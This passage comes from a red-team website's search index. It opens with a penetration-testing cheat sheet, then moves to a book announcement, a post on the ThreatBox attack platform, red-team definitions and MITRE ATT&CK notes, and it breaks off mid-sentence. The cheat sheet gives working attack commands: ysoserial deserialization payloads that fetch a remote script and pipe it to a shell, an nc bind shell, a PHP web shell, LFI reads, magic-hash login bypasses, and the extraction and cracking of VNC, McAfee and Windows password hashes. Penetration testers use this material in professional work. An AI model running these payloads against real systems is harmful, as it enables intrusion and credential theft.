https://jitpack.io/com/github/frohoff/ysoserial/master-SNAPSHOT/ysoserial-master-SNAPSHOT.jar\n* https://www.cigital.com/blog/mitigate-java-deserialization-vulnerability-jboss/\n</code></pre> <p>Auto-check and exploitation tool (https://github.com/joaomatosf/jexboss)</p> <pre><code>    git clone https://github.com/joaomatosf/jexboss.git\n    cd jexboss\n    pip install -r requires.txt\n    python jexboss.py -h\n    python jexboss.py -host http://target_host:8080\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#java-deserialization","title":"Java Deserialization","text":"<p>Java Deserialization Cheat Sheet</p> <p>How to get a full shell through Java Runtime.exec</p> <p>Ysoserial payload to execute full commands</p> <pre><code>    sh -c $@|sh . &lt;payload here&gt;\n</code></pre> <p>Generate a ysoserial payload to tell server to download further commands via curl and pipe to shell</p> <pre><code>    java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'sh -c $@|sh . curl http://10.42.65.40/commands.sh |sh' &gt; jenkins_curl_shell.bin\n</code></pre> <p>Generate a ysoserial payload to execute nc bind shell</p> <pre><code>    java -jar ysoserial-0.0.4-all.jar CommonsCollections1 'sh -c $@|sh . nc -lp 8088 -e /bin/bash' &gt; nc-jenkins.out\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#jmxinvokerservlet","title":"JMXInvokerServlet","text":"<pre><code>    ./ysoserial-master-v0.0.4-gad26e2b-61.jar CommonsCollections5 \"touch /tmp/pwned\" &gt;payload.txt\n</code></pre> <p>Generate payload with yososerial and send with Burp. You will get a jboss.invocation.InvocationException response on success or failure.</p> <p>Ensure the headers match these:</p> <pre><code>    POST /invoker/JMXInvokerServlet HTTP/1.1\n    Host: &lt;hostname/IP&gt;:8080\n    Content-Type:application/x-java-serialized-object; class=org.jboss.invocation.MarshalledValue\n    Content-Length: 2083\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#php","title":"PHP","text":"<p>LFI Read File (without executing)</p> <pre><code>    www.example.com/index.php?page=php://filter/read=convert.base64-encode/resource=config.php\n</code></pre> <p>LFI Read PHP session file for current sessionid</p> <pre><code>    http://blog.target.org/blog.php?page=/var/lib/php5/sess_th3cr1i5cm6m3dq98pb2sn9qg5\n</code></pre> <p>Create PHP backdoor/shell (windows):</p> <pre><code>    echo ^&lt;?php echo passthru($_GET['cmd']); ?^&gt; &gt; C:\\inetpub\\wwwroot\\s.php\n</code></pre> <p>PHP Command Execution Example</p> <pre><code>    Url/page.php?page=system&amp;help=cmd\n\n    @extract ($_REQUEST);\n    @die ($page($help));\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#php-type-juggling","title":"PHP Type Juggling","text":"<p>Bypass login authentication with PHP Type juggling by forcing a null condition in a string comparison.</p> <p>Add [] after a POST parameter \"?user_id[]=user22\" to force a NULL (zero-like) condition when comparing a string and an array</p>"},{"location":"blogs/2019/penetration-testing-pasties/#web-sockets","title":"Web Sockets","text":"<p>There are still relatively few dec ent Web Socket testing tools and most aren't very mature:</p> <ul> <li>BurpSuite - Limited options to view web socket communication, but no ability to edit or replay traffic</li> <li>ZAP Proxy - Ability to modify, replay, and fuzz web sockets, but still relatively clumsy</li> <li>WSSiP- WebSocket Manipulation Proxy - Application for capturing, modifying and sending custom WebSocket data from client to server and vice versa.</li> </ul>"},{"location":"blogs/2019/penetration-testing-pasties/#misc","title":"Misc","text":"<p>Things that don't seem to fit elsewhere!</p>"},{"location":"blogs/2019/penetration-testing-pasties/#decompiling-net-binaries","title":"Decompiling .NET Binaries","text":"<p>http://ilspy.net/</p>"},{"location":"blogs/2019/penetration-testing-pasties/#canary-tokens","title":"Canary Tokens","text":"<p>Tokens consist of a unique identifier (which can be embedded in either HTTP URLs or in hostnames.) Whenever that URL is requested, or the hostname is resolved, we send a notification email to the address tied to the token. You can get one in seconds, using just your browser.</p> <p>To obtain a token:</p> <pre><code>1. Visit http://canarytokens.org.\n2. Enter your email address. (It's only used to notify you when the token is triggered, mails are not used for any other purpose.)\n3. Enter a comment which describes where you're using the token. If the token is triggered in six months time, a comment will help you remember where you placed the token. Be specific (e.g. \"file watch on 192.168.100.2:/repos/repo3/README.txt\" or \"Password lure email in user@domain.com inbox\". We envisage having loads of tokens, so a good description is necessary.\n4. Click \"Generate Token\" to obtain your token.\n5. Copy the token and drop it somewhere it will be stumbled over.\n</code></pre> <p>Canarytokens.org</p>"},{"location":"blogs/2019/penetration-testing-pasties/#python-ssl-web-server","title":"Python SSL Web Server","text":"<p>Create PEM file</p> <pre><code>    openssl req -newkey rsa:2048 -x509 -keyout cakey.pem -out cacert.pem -days 3650\n</code></pre> <p>To concatenate the private key and public certificate into a pem file (which is required for many web-servers ) :</p> <pre><code>    cat cakey.pem cacert.pem &gt; server.pem\n</code></pre> <p>Python code</p> <pre><code>    import BaseHTTPServer, SimpleHTTPServer\n    import ssl\n\n    httpd = BaseHTTPServer.HTTPServer(('localhost', 4443), SimpleHTTPServer.SimpleHTTPRequestHandler)\n    httpd.socket = ssl.wrap_socket (httpd.socket, certfile='./server.pem', server_side=True)\n    httpd.serve_forever()\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#mcafee-sitelistxml-decryption","title":"McAfee SiteList.xml decryption","text":"<p>Sometimes DA and other admin level account passwords are stored in Sitelist.xml files on local hosts</p> <pre><code>    type \"C:\\ProgramData\\McAfee\\Common Framework\\SiteList.xml\" |findstr Password\n\n    \u2570 $ ./mcafee_sitelist_pwd_decrypt.py f2mwBTzPQdtnY6QNOsVexH9psAU8z0HbZ2OkDTrFXsR/abAFPM9B3Q==\n    Crypted password   : f2mwBTzPQdtnY6QNOsVexH9psAU8z0HbZ2OkDTrFXsR/abAFPM9B3Q==\n    Decrypted password : &lt;empty&gt;\n</code></pre> <p>https://github.com/PowerShellEmpire/Empire/blob/master/data/module_source/privesc/Get-SiteListPassword.ps1</p> <pre><code>git clone https://github.com/funoverip/mcafee-sitelist-pwd-decryption\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#tightvnc-password-retrieval","title":"TightVNC Password Retrieval","text":"<p>Retrieve TightVNC registry keys</p> <pre><code>    reg query HKEY_LOCAL_MACHINE\\SOFTWARE\\TightVNC\\server\n</code></pre> <p>Copy password from reg query output</p> <pre><code>    Password    REG_BINARY    7228098734BBBA06\n    ControlPassword    REG_BINARY    435D7A037B9FDC2B\n</code></pre> <p>Download vncpwd.exe or other VNC password decoder</p> <pre><code>    wine vncpwd.exe 7228098734BBBA06\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#password-lists","title":"Password Lists","text":"<p>https://github.com/danielmiessler/SecLists.gits</p>"},{"location":"blogs/2019/penetration-testing-pasties/#aix-passwords","title":"AIX Passwords","text":"<p>/etc/security/passwd</p> <p>Convert AIX passwd file to john format</p> <pre><code>    cat $1|egrep \":|password\" | sed 's/password = //g' | tr -d \"\\t \" |sed ':a;N;$!ba;s/:\\n/:/g'\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#create-ntlm-hash-from-mac-cli","title":"Create NTLM Hash from Mac CLI","text":"<pre><code>    echo -n password | iconv -t UTF-16LE | openssl md4\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#hash-cracking-examples","title":"Hash Cracking Examples","text":"<p>ophcrack using tables</p> <pre><code>    ophcrack -d /Volumes/data/table_vista_free/ -t /Volumes/data/table_vista_free -f ~/Desktop/ntlm.hashdump\n</code></pre> <p>Crack mscachev2 format with Hashcat (extremely slow)</p> <pre><code>    ./hashcat -m 2100 -a 0 mscachev2.dump ./wordlists/* -r rules/dive.rule\n</code></pre> <p>Hashcat SPNs with wordlist</p> <pre><code>    ./hashcat -m 13100 -a 0 spns.dump ./wordlists/* -r rules/dive.rule\n</code></pre> <p>JTR SPNs with wordlist</p> <pre><code>    ./john --format=krb5tgs spns.dump --wordlist=\n</code></pre>"},{"location":"blogs/2019/penetration-testing-pasties/#magic-hashes","title":"Magic Hashes","text":"<p>Source: https://www.whitehatsec.com/blog/magic-hashes/</p> <p>Use Case 1: Use the \u201cMagic\u201d Number below as a password or as a string that you expect to be hashed. When it is compared against the hash of the actual value, and if they both are treated as \u201c0\u201d and therefore evaluated as true, you will be able to log into the account without the valid password. This could be forced to happen in environments where automatic passwords are chosen for users during a forgot password flow and then attempting to log in immediately afterwards, as an example.</p> <ul> <li>https://example.com/login.php?user=bob&amp;pass=240610708</li> </ul> <p>Use Case 2: The attacker can simply take the example in the Hash column in the table below and use it as a value. In some cases these values are simply done as a look-up against known values (in memory, or perhaps dumped from a database and compared). By simply submitting the hash value, the magic hash may collide with other hashes which both are treated as \u201c0\u201d and therefore compare to be true. This could be caused to happen</p> <ul> <li>https://example.com/login.php?user=bob&amp;token=0e462097431906509019562988736854</li> </ul> <p>Hashes</p> <pre><code>    HashType    HashLength \u201cMagic\u201dNumber    Magic Hash                                  Found By\n    md2         32          505144726       0e015339760548602306096794382326            WhiteHat Security, Inc.\n    md4         32          48291204        0e266546927425668450445617970135            WhiteHat Security, Inc.\n    md5         32          240610708       0e462097431906509019562988736854            Michal Spacek\n    sha1        40          10932435112     0e07766915004133176347055865026311692244    Independently found by Michael A. Cleverly &amp; Michele Spagnuolo &amp; Rogdham\n    sha224      56\n    sha256      64\n    sha384      96\n    sha512      128\n    ripemd128   32          315655854       0e251331818775808475952406672980            WhiteHat Security, Inc.\n    ripemd160   40          20583002034     00e1839085851394356611454660337505469745    Michael A Cleverly\n    ripemd256   64\n    ripemd320   80\n    whirlpool   128\n    tiger128,3  32          265022640       0e908730200858058999593322639865            WhiteHat Security, Inc.\n    tiger160,3  40          13181623570     00e4706040169225543861400227305532507173    Michele Spagnuolo\n    tiger192,3  48\n    tiger128,4  32          479763000       00e05651056780370631793326323796            WhiteHat Security, Inc.\n    tiger160,4  40          62241955574     0e69173478833895223726165786906905141502    Michele Spagnuolo\n    tiger192,4  48\n    snefru      64\n    snefru256   64\n    gost        64\n    adler32     8           FR              00e00099                                    WhiteHat Security, Inc.\n    crc32       8           2332            0e684322                                    WhiteHat Security, Inc.\n    crc32b      8           6586            0e817678                                    WhiteHat Security, Inc.\n    fnv132      8           2186            0e591528                                    WhiteHat Security, Inc.\n    fnv164      16          8338000         0e73845709713699                            WhiteHat Security, Inc.\n    joaat       8           8409            0e074025                                    WhiteHat Security, Inc.\n    haval128,3  32          809793630       00e38549671092424173928143648452            WhiteHat Security, Inc.\n    haval160,3  40          18159983163     0e01697014920826425936632356870426876167    Independently found by Michael Cleverly &amp; Michele Spagnuolo\n    haval192,3  48          48892056947     0e4868841162506296635201967091461310754872302741    Michael A. Cleverly\n    haval224,3  56\n    haval256,3  64\n    haval128,4  32          71437579        0e316321729023182394301371028665            WhiteHat Security, Inc.\n    haval160,4  40          12368878794     0e34042599806027333661050958199580964722    Michele Spagnuolo\n    haval192,4  48\n    haval224,4  56\n    haval256,4  64\n    haval128,5  32          115528287       0e495317064156922585933029613272            WhiteHat Security, Inc.\n    haval160,5  40          33902688231     00e2521569708250889666329543741175098562    Michele Spagnuolo\n    haval192,5  48          52888640556     0e9108479697641294204710754930487725109982883677    Michele Spagnuolo\n    haval224,5  56\n    haval256,5  64\n</code></pre>"},{"location":"blogs/2020/red-team-development-and-operations/","title":"Red Team Development and Operations Book","text":"<p>James Tubberville | January 20, 2020 | Tweet This Post: </p> <p></p> <p>\"Red Team Development and Operations\", Zero-Day Edition Joe Vest (@joevest) and James Tubberville (@minis_io)</p> <p>We are excited to announce the release of our new book</p>"},{"location":"blogs/2020/red-team-development-and-operations/#red-team-development-and-operations","title":"Red Team Development and Operations","text":"<p>This book is the culmination of years of experience in the information technology and cybersecurity field. Components of the book have existed as rough notes, ideas, informal and formal processes developed and/or adopted by the authors as we led and executed Red Team engagements over many years. These components have been used to successfully plan, deliver, and perform professional Red Team engagements of all sizes and complexities.</p> <p>One of our first formal attempts to capture this information was the SANS SEC564 Red Team Operation and Threat Emulation course. This first effort was an attempt to document the concepts in a format usable by others. Although, the SANS course was extremely successful and received highly rated reviews, we have moved on from SANS training and have completed this book to detail Red Team operations in an easily maintainable and digestible format.</p> <p>It has taken years of research, experimentation (a.k.a trial-and-error), and execution to discern what elements should and should not be part of this text. Our goal was to provide practical guidance to assist you (or your team) in the development, management, and execution of a professional Red Team. Volumes upon volumes could be written on each individual topic; however, we have attempted to write to the 80/20 rule. Eighty (80) percent of what you see, hear, and experience is the least valuable information. This book covers what we believe to be the twenty (20) percent of Red Team Development and Operations that has the most value. It will not only make you a better Red Teamer, but it should also provide a means to streamline your efforts and alleviate your work-load. In the end, improving (making things better) and enjoying yourself in the process is what counts the most.</p> <p>The first release is our \"zero-day\" edition. We want to get this book in the public space and will be updated as needed. The book has a companion website, https://redteam.guide. This website contains tips, templates, and other extras that help develop or run a Red Team.</p>"},{"location":"blogs/2020/red-team-development-and-operations/#self-published-on-amazon","title":"Self published on Amazon","text":"<p> Paperback - \"Red Team Development and Operations\", Zero-Day Edition</p> <p> eBook - \"Red Team Development and Operations\", Zero-Day Edition</p> <p>B&amp;N Paperback - \"Red Team Development and Operations\", Zero-Day Edition</p> <p>(\"Red Team Development and Operations\", Zero-Day Edition) Joe Vest (@joevest) and James Tubberville (@minis_io)</p>"},{"location":"blogs/2020/threatbox-standard-attack-platform/","title":"ThreatBox - Standard Attack Platform","text":"<p>James Tubberville | February 28, 2020 | Tweet This Post: </p> <p> </p> <p> threatbox</p> <p>Security testers need a mixed set of tools. Some in the penetration testing and red teaming community argue that you shouldn't be limited to a specific set of tools. A threat can use anything they desire, right? This is true, but we are not the threat. We are part of the professional security testing community. Security testers shouldn't be limited to a specific set of tools, but downloading and using something randomly found on the internet is risky. A balance is needed. This balance is one way to separate security professionals from those who 'hack stuff.' We need a standard process to control the tools we use that are flexible enough to provide the capability we need with some assurances around the codebase. This can be achieved through a standard attack platform.</p> <p>A standard attack platform is the common set of tools and hardware used by security testers, like a Red Team, to perform an engagement. The term standard is critical.</p>"},{"location":"blogs/2020/threatbox-standard-attack-platform/#a-standard-platform-allows-for","title":"A standard platform allows for","text":""},{"location":"blogs/2020/threatbox-standard-attack-platform/#better-logging","title":"Better logging","text":"<p>A common platform shares the same base build, directory structure, and built-in data capture capability. At a minimum, tracks and logs terminal commands. Better logging equals better engagement.</p>"},{"location":"blogs/2020/threatbox-standard-attack-platform/#easier-deconfliction","title":"Easier deconfliction","text":"<p>A common set of tools and payloads, along with a standard logging process, can help an organization quickly work through the deconfliction process. (https://redteam.guide/docs/definition-lexicon/#deconfliction)</p>"},{"location":"blogs/2020/threatbox-standard-attack-platform/#common-baseline","title":"Common baseline","text":"<p>A universal base provides a stable, functional environment for a Red Team to operate. Consistency means more efficient operators.</p>"},{"location":"blogs/2020/threatbox-standard-attack-platform/#access-to-a-better-toolset","title":"Access to a better toolset","text":"<p>A standard platform is designed using the knowledge of many people. Multiple senior team members can contribute their best tools, references, and guides. This raises the overall capability of a team by including expertise in the toolbox. Junior operators can utilize more sophisticated tools or techniques that often only exist in someone's head.</p>"},{"location":"blogs/2020/threatbox-standard-attack-platform/#custom-tools-work-across-attack-platforms","title":"Custom tools work across attack platforms","text":"<p>Red Teams and security testers often build custom tools. If these tools are developed to a common base, like a standard attack platform, they will work for all operators. Tools should just work, no more fighting installation of dependencies or \u201cit works on my box\u201d.</p>"},{"location":"blogs/2020/threatbox-standard-attack-platform/#tool-vetting","title":"Tool vetting","text":"<p>In some cases, Blue Teams or customers require red team tools to be vetted as threat faithful or provide assurance tools have no unknown malicious risk. When using a standard attack platform, a tool vetting process can be used before including a tool to the toolbox. This ensures all tools are managed and validated before use. Tool validation often occurs due to fear that the Red Team tools may cause unexpected damage to a system Demonstrating active control of a toolset is a way to professionalism and reduce fears that may arise during security tests.</p>"},{"location":"blogs/2020/threatbox-standard-attack-platform/#consistent-processes","title":"Consistent processes","text":"<p>Using a common baseline enables a standard set of procedures that allow the skills and knowledge of senior operators to be used by junior operators. This can significantly enhance an engagement's success and better use of limited resources.</p> <p>Using a standard platform does not mean limiting the toolset. If a tool or capability is required, make it part of the platform, and document its inclusion. If an operator needs a new tool or unique ability for an engagement, use it. The standard attack platform is a common base meant to provide a stable and functional environment for Red Team operators or security testers to operate. It is not designed to limit the Red Team.</p> <p>TLDR: Be a security professional. Control the tools you use.</p> <p>![Red Team Guide][http://redteam.guide] Details on the concept of a Standard Attack Platform and other Red Teaming topics can be found in the book Red Team Development and Operations - A practical guide, written by Joe Vest and James Tubberville.</p>"},{"location":"blogs/2020/threatbox-standard-attack-platform/#threatbox","title":"ThreatBox","text":"<p> threatbox</p> <p>ThreatBox is a standard and controlled Linux based attack platform. I've used a version of this for years. It started as a collection of scripts, lived as a rolling virtual machine, existed as code to build a Linux ISO, and has now been converted to a set of ansible playbooks. Why Ansible? Why not? This seemed to be the next natural evolution to the configuration of standard attack platforms.</p> <p>Threatbox installed using the default setup is not a complete managed solution but is a great starting point to build and create a controlled attack platform.</p> <p>Provisioning in the Cloud</p> <p>This project uses Ansible playbooks and roles to perform post-deployment configuration on a Linux target. It was tested on Ubuntu 18.04 provisioned in Digitalocean. Provisioning security testing boxes to cloud services providers is a personal preference determined by your own risk factors. Cloud provisioning is not required but does demonstrate the the system deployment side of DevOps. This project will not provision your target systems. This set of playbooks can be run against a Linux box you control (local or remote).</p> <p>It is designed to be used as a starter process in creating, managing, and using a standard attack platform for red teaming or penetration testing.</p> <p>A few features:</p> <ul> <li>Standard tools defined as ansible roles</li> <li>GUI access via VNC over SSH</li> <li>Customizations designed to make security testing easier</li> <li>Variable driven to easily add or remove git repositories, OS packages, or python modules. (threatbox.yml)</li> <li>Version tracking of the deployed instance version and deployed tool versions. Version tracking helps meet compliance requirements and can help minimize fear by actively tracking all tools.</li> <li>Deployed software tracked in ~/Desktop/readme</li> <li>SSH port auto-switching. Deployment begins on SSH port 22, but reconfigures the target system to the desired SSH port using the <code>ansible_port</code> variable in <code>threatbox.yml</code></li> <li>Download and locally compile several .net toolkits (i.e., SeatBelt.exe from Ghostpack https://github.com/GhostPack/Seatbelt)</li> <li>Python projects installed using pipenv to reduce dependency conflict. Use <code>pipenv shell</code> in the project directory to access. See https://realpython.com/pipenv-guide/ for pipenv usage guidance</li> </ul> <p>Here are a few tools installed and ready for use:</p> <ul> <li>C2</li> <li>crackmapexec</li> <li>Metasploit</li> <li>Covenant</li> <li>Merlin</li> <li>Silenttrinity</li> <li>Web</li> <li>BurpSuite</li> <li>Eyewitness</li> <li>sqlmap</li> <li>tinyshell</li> <li>GhostPack</li> <li>Safetykatz</li> <li>Seatbelt</li> <li>Sharpdpapi</li> <li>Sharpdump</li> <li>Sharpup</li> <li>Sharpwmi</li> </ul>"},{"location":"blogs/2020/threatbox-standard-attack-platform/#screenshots","title":"Screenshots","text":"<p>Connect to the GUI via VNC over SSH</p> <pre><code>threatboxip=10.10.10.10\nssh -p52222 -i ~/.ssh/threatbox_id_rsa -L 5901:localhost:5901 root@$threatboxip\n</code></pre> <p>VNC over SSH </p> <p>ThreatBox </p> <p>Tracking of installed tools </p> <p>Custom terminal options provide more context </p> <p>Light version of the terminal </p> <p>Attack platform custom commands </p> <p>Automatic logging of terminals </p> <p>Tool categories </p> <p>Pipenv used to control python projects</p> <p></p> <p></p>"},{"location":"blogs/2020/threatbox-standard-attack-platform/#red-team-development-and-operations","title":"Red Team Development and Operations","text":"<p> Paperback - \"Red Team Development and Operations\", Zero-Day Edition</p> <p> eBook - \"Red Team Development and Operations\", Zero-Day Edition</p> <p>Companion site. https://redteam.guide/</p> <p>Find the book on Barnes &amp; Noble. https://www.barnesandnoble.com/w/red-team-development-and-operations-james-tubberville/1136264411?ean=9798601431828</p> <p>Joe Vest (@joevest) and James Tubberville (@minis_io)</p>"},{"location":"redteaming/cheatsheets/","title":"Cheat Sheets","text":""},{"location":"redteaming/cheatsheets/#red-team-cheat-sheets","title":"Red Team Cheat Sheets","text":"<p>@harmj0y</p> <ul> <li>Red Team Cheat Sheets</li> <li>CobaltStrike Beacon</li> <li>PowerShell Empire</li> <li>PowerSploit</li> <li>PowerView</li> <li>PowerUp</li> </ul>"},{"location":"redteaming/cheatsheets/#windows-active-directory","title":"Windows Active Directory","text":"<ul> <li>A Guide to Attacking Domain Trusts http://www.harmj0y.net/blog/redteaming/a-guide-to-attacking-domain-trusts</li> </ul>"},{"location":"redteaming/cheatsheets/#powerview","title":"PowerView","text":"<p>Make PowerView Great Again</p>"},{"location":"redteaming/cheatsheets/#sans-cheat-sheets","title":"SANS Cheat Sheets","text":"<ul> <li>PowerShell</li> <li>Windows Command Line</li> </ul>"},{"location":"redteaming/cheatsheets/#blue-teaming-cheat-sheets","title":"Blue Teaming Cheat Sheets","text":"<ul> <li>SANS Blue Team Wiki</li> </ul>"},{"location":"redteaming/cheatsheets/#powershell-cheat-sheets","title":"Powershell Cheat Sheets","text":"<ul> <li>PowerShell</li> </ul>"},{"location":"redteaming/cheatsheets/#bloodhound","title":"Bloodhound","text":"<ul> <li>DogWhisperer - BloodHound Cypher Cheat Sheet -  https://github.com/SadProcessor/Cheats/blob/master/DogWhispererV2.md</li> </ul>"},{"location":"redteaming/definitions/","title":"Definitions","text":""},{"location":"redteaming/definitions/#blue-cell","title":"Blue Cell","text":"<p>The blue cell is the opposite side of red. Is it all the components defending a target network. The blue cell is typically comprised of blue team members, defenders, internal staff, and an organization\u2019s management.</p>"},{"location":"redteaming/definitions/#blue-team","title":"Blue Team","text":"<p>A security team that defends against threats.</p>"},{"location":"redteaming/definitions/#command-and-control-c2","title":"Command and Control (C2)","text":"<p>Command and Control (C2) is the influence an attacker has over a compromised computer system that they control.</p>"},{"location":"redteaming/definitions/#engagement-exercise-control-group-ecg","title":"Engagement / Exercise Control Group (ECG)","text":"<p>The Engagement (or Exercise) Control Group is ultimately responsible for all activities conducted during the engagement. Most often, the Engagement Control Group is composed of one or two senior managers from the target environment (for example a Chief Information Officer or Chief Operating Officer), one member from the Information Technology department of the environment, a White Cell liaison, and a Red Team liaison. More may be added as required. All must be Trusted Agents.</p>"},{"location":"redteaming/definitions/#exfiltration","title":"Exfiltration","text":"<p>Exfiltration is the extraction of information from a target. This is typically through a covert channel.</p>"},{"location":"redteaming/definitions/#ioc-indicator-of-compromise","title":"IOC (Indicator of Compromise)","text":"<p>Indicators of Compromise (IOCs) are artifacts that identify or describe threat actions.</p>"},{"location":"redteaming/definitions/#opfor","title":"OPFOR","text":"<p>An Opposing Force, or enemy force, that is typically used by the military in war-gaming scenarios. Red Teams are commonly associated with or support an OPFOR in war-gaming scenarios.</p>"},{"location":"redteaming/definitions/#operational-impact","title":"Operational Impact","text":"<p>An operational impact is the effect of a goal-driven action within a target environment.</p>"},{"location":"redteaming/definitions/#opsec","title":"OPSEC","text":"<p>OPSEC or Operational Security is a process that identifies critical information to determine if friendly actions can be observed by enemy intelligence, determines if information obtained by adversaries could be interpreted to be useful to them, and then executes selected measures that eliminate or reduce adversary exploitation of friendly critical information.  In terms of Red Teaming, it is understanding what actions Blue can observe and minimizes exposure.</p>"},{"location":"redteaming/definitions/#red-cell","title":"Red Cell","text":"<p>The term red cell is borrowed from the military. It is commonly associated with a group that plays OPFOR (opposing force) during red vs. blue exercises. A red cell is the components that make up the offensive portion of a red team engagement that simulates the strategic and tactical responses of a given target. The red cell is typically comprised of red team leads and operators and is commonly referred to as Red Team instead of Red Cell.</p>"},{"location":"redteaming/definitions/#red-team","title":"Red Team","text":"<p>A Red Team is an independent group that, from the perspective of a threat or adversary, explores alternative plans and operations to challenge an organizatio\u00f8n to improve its effectiveness.</p>"},{"location":"redteaming/definitions/#red-team-lead","title":"Red Team Lead","text":"<p>Serves as the operational and administrative lead for the Red Team. Conducts engagement, budget, and resource management for the Red Team, Provides oversight and guidance for engagements, capabilities, and technologies. Ensures adherence to all laws, regulations, policies, and Rules of Engagement.</p>"},{"location":"redteaming/definitions/#red-team-operator","title":"Red Team Operator","text":"<p>Complies with all Red Team requirements under the direction of the Red Team Lead. Operational executor of the engagement. Applies Red Team TTPs to the engagement. Provides technical research and capability to the Red Team. Keeps detailed logs during each phase of the engagement. Provides log and information support for creation of the final report</p>"},{"location":"redteaming/definitions/#roe-rules-of-engagement","title":"ROE (Rules of Engagement)","text":"<p>The Rules of Engagement establish the responsibilities, relationships, and guidelines among the Red Team, the customer, the system owner, and any stakeholders required for engagement execution.</p>"},{"location":"redteaming/definitions/#threat","title":"Threat","text":"<p>A threat is an expression of intention to inflict evil, injury, or damage. Threat Emulation Threat Emulation is the process of mimicking the TTPs of a specific threat.</p>"},{"location":"redteaming/definitions/#tradecraft","title":"Tradecraft","text":"<p>Tradecraft is the techniques and procedures of espionage. Tradecraft is typically associated with the intelligence community. TTPs and Tradecraft are used interchangeably in this course.</p>"},{"location":"redteaming/definitions/#trusted-agent-ta","title":"Trusted Agent (TA)","text":"<p>The Trusted Agent\u2019s primary role is to limit irreversible damage and risk to life, limb, eyesight, and equipment; however, they are more often used to prevent the defenders from causing unexpected self-inflicted damage. A Trusted Agent (TA) has privileged and detailed knowledge of engagement activities, milestones, conditions, and the engagement status that would unduly bias or influence the actions of the environment staff and defenders. A Trusted Agent must protect all information from being provided to any party without the express approval of the Engagement Control Group.</p>"},{"location":"redteaming/definitions/#ttps","title":"TTPs","text":"<p>TTPs are Tactics, Techniques and Procedures (sometimes called Tools, Techniques, and Procedures).</p>"},{"location":"redteaming/definitions/#white-cell","title":"White Cell","text":"<p>Serves as referee between Red Team activities and defender responses during an engagement. Controls the engagement environment/network. Monitors adherence to the ROE. Coordinates activities required to achieve engagement goals. Correlates Red Team activities with defensive actions. Ensures the engagement is conducted without bias to either side.</p>"},{"location":"redteaming/mitre_attack/","title":"MITRE ATT&amp;CK","text":"<p>MITRE\u2019s Adversarial Tactics, Techniques, and Common Knowledge (ATT&amp;CK\u2122) is a curated knowledge base and model for cyber adversary behavior, reflecting the various phases of an adversary\u2019s lifecycle and the platforms they are known to target. ATT&amp;CK is useful for understanding security risk against known adversary behavior, for planning security improvements, and verifying defenses work as expected.</p> <p></p> <p>ATT&amp;CK is broken into Tactics, Techniques, and Procedures</p> <ul> <li>Tactics are the tactical goals a threat may use during an operation.</li> <li>Techniques describe the actions threats take to achieve their objectives.</li> <li>Procedures are the technical steps required to perform the action.</li> </ul> <p>This frameworks provides a classification of all threat actions regardless of the underlying vulnerabilities. </p> <p>Red teams can emulate realistic TTPs through research and experience.  Much of this information has been complied in to ATT&amp;CK. ATT&amp;CK can be thought of a menu of TTPs. Red teams can use this to ensure they have a comprehensive set of threat TTPs, and blue teams can use this to build a scorecard of how well they are able to defend against various TTPs.</p>"},{"location":"redteaming/mitre_attack/#references","title":"References","text":"Description Link ATT&amp;CK https://attack.mitre.org/wiki/Main_Page PRE-ATT&amp;CK https://attack.mitre.org/pre-attack/index.php/Main_Page ATT&amp;CK Navigator https://www.mitre.org/capabilities/cybersecurity/overview/cybersecurity-blog/the-attck%E2%84%A2-navigator-a-new-open-source ATT&amp;CK Navigator Example https://mitre.github.io/attack-navigator/enterprise/"},{"location":"redteaming/red_vs_pen_vs_vuln/","title":"Red Teaming VS Penetration Testing VS Vulnerability Testing","text":"<p>A threat-based approach to security testing may use several names; Red Teaming, Threat Operations, Threat Assessment, Purple Teaming, Adversarial Assessment, Penetration Testing, Vulnerability Testing. These are not all the same, and it is important that the security industry defines terms to establish a common understanding. To help with this, all threat-based security testing in this post will be referred to as Red Teaming.</p> <p>Definition: Red Teaming is the process of using tactics, techniques, and procedures (TTPs) to emulate a real-world threat with the goals of training and measuring the effectiveness of people, processes, and technology used to defend an environment.</p> <p>In other words, red teaming is the process of emulating a threat using realistic techniques with the goal of training blue teams and/or measuring security operations as a whole.</p> <p>Red teaming can provide a deep understand of the negative impacts an intelligent threat-actor can have against a target.</p>"},{"location":"redteaming/red_vs_pen_vs_vuln/#red-teaming-in-perspective-to-organizational-risk","title":"Red Teaming in Perspective to Organizational Risk","text":"<p>Security testing of any sort is ultimately about managing organization risk to threats.</p> <p>Using an inverse pyramid, we can illustrate the relationships between Red Teaming, Penetration Testing, and Vulnerability Assessments. This will help further define what Red Teaming IS and IS NOT.</p> <p></p> <ul> <li>Vulnerability assessments tend to be wide in coverage but narrow in scope. Consider a vulnerability assessment of all enterprise workstations. The scope is very wide, but not very deep in context of organizational risks. What can be said about risk when flaws are found? Organizational risk can only be understood at the workstation level? Overall risk to an organization may be extrapolated to a small degree, but generally stays at that workstation level. Vulnerability assessments are good at reducing the attack surface but do not provide direct information in terms of organizational risk.</li> <li>Penetrations tests take vulnerability assessments to the next level by exploiting and proving out attack paths. Penetration tests can often look and feel like a red team engagement and even use some of the same tools or techniques. The key difference lies in the goals and intent. The goal of a penetration test is to execute an attack against a target system to identify and measure risks associated with the exploitation of a target\u2019s attack surface. Organizational risks can be indirectly measured and are typically extrapolated from some technical attack. What about the people and processes? This is where red teaming fits.</li> <li>Red Team Engagements are scenario based engagements driven by specific threat goals.  Red teaming focuses on security operations as a whole and includes people, processes, and technology. Red teaming specifically focuses on goals related to training blue teams or measuring how security operations can impact a threat\u2019s ability to operate. Technical flaws are secondary to understanding how the threat was able to impact an organization\u2019s operations or how security operations was able to impact a threat\u2019s ability to operate.</li> </ul>"},{"location":"redteaming/red_vs_pen_vs_vuln/#bottom-line","title":"Bottom Line","text":"<p>Vulnerability assessment and Penetration tests are a means to identify technical flaws with the ultimate goal of reducing a targets attack surface.</p> <p>Red teaming is a goal driven scenario used to train or measure blue. Red teaming goals lie in understanding security operations as a whole. people, processes, and technology.</p>"},{"location":"redteaming/red_vs_pen_vs_vuln/#references","title":"References","text":"<p>Threat Gets a Vote - Applying a threat-based approach to security testing</p>"},{"location":"redteaming/redteaming/","title":"What is Red Teaming?","text":"<p>Red teaming is a 